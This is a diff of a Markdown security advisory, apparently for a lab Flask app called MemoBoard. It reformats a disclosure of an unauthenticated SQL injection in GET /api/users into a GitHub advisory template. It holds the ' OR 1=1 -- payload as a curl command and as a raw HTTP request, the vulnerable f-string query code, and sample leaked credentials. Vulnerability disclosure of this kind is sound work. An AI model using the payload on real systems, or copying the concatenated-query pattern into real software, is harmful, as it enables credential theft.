@@ -1,92 +1,104 @@
-# Advisory: MemoBoard Unauthenticated SQL Injection in GET /api/users
+# GitHub Security Advisory
 
-## Summary
+Write all fill-in content in English (GitHub Advisory form). Do not use Chinese in Title, Description, or Severity notes. Copy from `### Summary` through Impact into the Description field. Leave Patched versions empty if there is no upstream fix.
 
-MemoBoard v0.5.0 contains an unauthenticated SQL injection vulnerability in the `GET /api/users` endpoint. The `name` query parameter is directly concatenated into a SQL query via Python f-string interpolation without parameterization or escaping. Because the query's SELECT list includes the `password` column, an attacker can inject `' OR 1=1 --` to dump all users' plaintext passwords, including the administrator account.
+Do not render this file as HTML in the product UI; keep it as copy-paste Markdown source.
 
-## Product
+---
 
-MemoBoard v0.5.0 (Flask-based intranet memo board application)
+## Title
 
-## Affected Component
-
-- File: `src/board/engine.py`, function `run_user_lookup`, line 71
-- Endpoint: `GET /api/users?name=<payload>` (`src/app.py`, lines 63-70)
-
-## Vulnerability Type
-
-CWE-89: Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")
-
-## Severity
-
-High
-
-## Attack Surface
-
-Frontend (unauthenticated) — the `/api/users` endpoint has no authentication check.
-
-## Root Cause
-
-The `run_user_lookup` function constructs its SQL query using f-string interpolation:
-
-```python
-sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
+```
+MemoBoard unauthenticated SQL injection in GET /api/users leaks user passwords
 ```
 
-The `name` parameter originates from `request.args.get("name")` in the `api_users` route, which performs no authentication, validation, or sanitization before passing it to `run_user_lookup`. The query result (including the `password` field) is returned directly to the client via `jsonify`.
+---
 
-## Impact
+## Description
 
-An unauthenticated attacker can extract all user records from the database, including:
-- Plaintext passwords for all users (including admin)
-- Email addresses
-- User roles
+Copy from the next `### Summary` through the end of Impact.
 
-This enables authentication bypass and privilege escalation by using the leaked admin credentials to access restricted functionality.
+### Summary
 
-## Proof of Concept
+An unauthenticated caller can send a crafted `name` query parameter to `GET /api/users` and dump every row in `users`, including plaintext `password` values for the administrator account. The route performs no authentication, and the lookup concatenates the parameter into SQL instead of using a bound query.
 
-```bash
-curl "http://TARGET:5000/api/users?name=' OR 1=1 --"
-```
+### Details
 
-Response:
-```json
-{
-  "users": [
-    {"id": 1, "name": "alice", "role": "user", "email": "alice@memoboard.lab", "password": "alice123"},
-    {"id": 2, "name": "bob", "role": "user", "email": "bob@memoboard.lab", "password": "bob123"},
-    {"id": 3, "name": "admin", "role": "admin", "email": "admin@memoboard.lab", "password": "admin123"}
-  ]
-}
-```
+MemoBoard 0.5.0 is a Flask intranet memo board. `api_users` in `src/app.py` reads `request.args.get("name")` with no session or token check and passes it to `run_user_lookup` in `src/board/engine.py`. That helper builds `SELECT id, name, role, email, password FROM users WHERE name = '{name}'` with an f-string and executes it. The intended control is a parameterized `WHERE name = ?` query (already used by `list_users` in `src/board/store.py`) and omission of `password` from any public SELECT list.
 
-## Exploit Complexity
+Same-root-cause sibling: `src/app.py` `api_users` (unauthenticated JSON return of the injected result set). Suggested fix: bind the name with `?`, drop `password` from the projection, and require an authenticated session on `/api/users`.
 
-Single request — no authentication required, no special conditions needed.
+### Vulnerable code
 
-## Defense Status
+- Path: `src/board/engine.py:71`
 
-No effective defense — the endpoint has no authentication, no input validation, and no parameterized query.
-
-## Configuration Premise
-
-Default configuration — the vulnerability exists in the default deployment with no configuration changes required.
-
-## Remediation
-
-1. Use parameterized queries instead of string concatenation:
 ```python
 def run_user_lookup(name: str) -> list[dict]:
-    sql = "SELECT id, name, role, email FROM users WHERE name = ?"
+    # String-concatenated SQL. `name` is a query parameter.
+    sql = f"SELECT id, name, role, email, password FROM users WHERE name = '{name}'"
     with _connect() as conn:
-        rows = conn.execute(sql, (name,)).fetchall()
+        rows = conn.execute(sql).fetchall()
     return [dict(r) for r in rows]
 ```
-2. Remove the `password` column from the SELECT list — passwords should never be returned in API responses.
-3. Add authentication to the `GET /api/users` endpoint.
 
-## References
+Entry point that forwards the unsanitized query parameter:
 
-- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
-- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- Path: `src/app.py:63`
+
+```python
+@app.get("/api/users")
+def api_users():
+    name = request.args.get("name", "")
+    if name:
+        rows = run_user_lookup(name)
+    else:
+        rows = list_users()
+    return jsonify({"users": rows})
+```
+
+### PoC
+
+Requires a running instance you are authorized to test. Do not include real secrets.
+
+**Must include at least one raw HTTP request packet** in a `http` fenced block (method, path, headers, and body if any). Do not rely on curl one-liners or screenshots alone.
+
+```http
+GET /api/users?name=' OR 1=1 -- HTTP/1.1
+Host: TARGET:5000
+Accept: application/json
+Connection: close
+```
+
+Expected JSON includes every seeded user and plaintext passwords (including `admin`). Reproducible CLI in the same directory:
+
+```text
+python poc.py -u http://TARGET:5000
+python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
+```
+
+Do not run this against systems you do not own or have authorization to test.
+
+### Impact
+
+CWE-89. Any network caller who can reach the default MemoBoard HTTP port can read all user records, including administrator credentials. Remaining controls: none on the default deployment; SQLite `execute` here is a single statement, so this issue is demonstrated as data disclosure rather than stacked-query writes. Leaked admin credentials can be reused on `POST /api/login`; that follow-on is a separate finding.
+
+---
+
+## Affected products
+
+| Field | Value |
+| --- | --- |
+| Ecosystem | `pip` |
+| Package name | memoboard |
+| Affected versions | 0.5.0 |
+| Patched versions | |
+
+---
+
+## Severity / CWE
+
+- **Severity:** High
+- **CVSS 3.1:** 7.5 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
+- **CVSS 4.0:** 8.7 High — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
+- **CWE:** CWE-89 Improper Neutralization of Special Elements used in an SQL Command ("SQL Injection")
+- **Related:**
